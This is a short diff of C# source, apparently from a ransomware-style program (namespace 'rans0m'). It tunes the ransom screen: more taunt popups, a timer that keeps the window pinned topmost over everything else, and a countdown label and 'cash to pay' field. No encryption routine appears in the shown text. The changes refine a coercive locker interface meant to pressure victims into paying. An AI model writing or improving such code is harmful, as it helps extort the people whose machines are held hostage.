@@ -77,7 +77,7 @@ namespace rans0m
             SetupTopMost();
         }
 
-        private const int PopupTarget = 5; // keep 5 taunts on screen at once
+        private const int PopupTarget = 7; // keep 7 taunts on screen at once
 
         private void SpawnNextPopup()
         {
@@ -136,13 +136,13 @@ namespace rans0m
         {
             try
             {
-                topMostTimer = new System.Windows.Forms.Timer { Interval = 200 };
+                // Labels are fronted once in Load; the tick only re-pins topmost
+                // (per-tick BringToFront restacks all 7 popups and causes lag).
+                topMostTimer = new System.Windows.Forms.Timer { Interval = 500 };
                 topMostTimer.Tick += (s, e) =>
                 {
                     if (IsDisposed || !IsHandleCreated) return;
                     try { NativeMethods.SetWindowPos(Handle, NativeMethods.HWND_TOPMOST, 0, 0, 0, 0, NativeMethods.SWP_NOMOVE | NativeMethods.SWP_NOSIZE | NativeMethods.SWP_NOACTIVATE); } catch { }
-                    // Ensure labels are visible and on top
-                    try { lbl_time.BringToFront(); txt_cashToPay.BringToFront(); } catch { }
                 };
                 topMostTimer.Start();
                 FileLogger.Log("[Ransomed] TopMost timer started");
